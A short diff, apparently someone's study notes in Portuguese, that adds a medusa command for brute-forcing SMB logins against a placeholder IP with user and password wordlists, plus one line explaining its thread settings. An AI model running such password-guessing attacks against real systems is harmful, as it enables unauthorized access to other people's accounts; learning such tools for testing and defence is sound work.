@@ -1,0 +1,2 @@
+medusa -h "IP" -U "arquivos de users" -P "arquivos de senha" -M smbnt -t 2 -T 50:
+o comando evidencia o tipo de ataque smb com dois atques por 50 hosts.
